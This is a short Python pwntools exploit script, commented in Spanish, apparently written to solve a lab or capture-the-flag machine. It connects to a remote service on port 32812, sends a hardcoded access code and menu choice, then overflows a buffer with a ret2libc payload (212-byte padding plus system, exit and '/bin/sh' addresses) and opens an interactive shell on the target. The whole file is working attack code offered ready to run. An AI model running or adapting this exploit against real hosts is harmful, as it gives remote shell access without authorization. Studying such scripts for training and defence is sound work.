#!/usr/bin/python3
from argparse import ArgumentParser
from pwn import *

def exit_handler(sig, frame):
	print("\n[!] Saliendo de la aplicacion...")
	sys.exit(1)
	
#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

def shellcode_reverse_tcp():
    offset = 212 #numeros de caracteres necesarios para sobreescribir el EIP
    
    shellcode = b""
    shellcode += b"A"*offset
    shellcode += p32(0xf7e4c060) #direccion de memoria system
    shellcode += p32(0xf7e3faf0) #direccion de memoria exit
    shellcode += p32(0xf7f6ddd5) #direccion de memoria sh
        
    return shellcode
   
def exploit(direccion_ip):
    try:
        context(os='linux', arch='i386')
        p = remote(direccion_ip, 32812)
        p.recvuntil(b"Enter Bridge Access Code:")
        p.sendline(b"picarda1")
        p.recvuntil(b"Waiting for input:")
        p.sendline(b"4")
        p.recvuntil(b"Enter Security Override:")
        p.sendline(shellcode_reverse_tcp())

        p.interactive()
    except EOFError as e:
        print("Ha ocurrido un error en el manejo del socket: {}".format(e))

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="Direccion IP del host a analizar", required=True)
    
    args = parser.parse_args()
    exploit(args.ip)
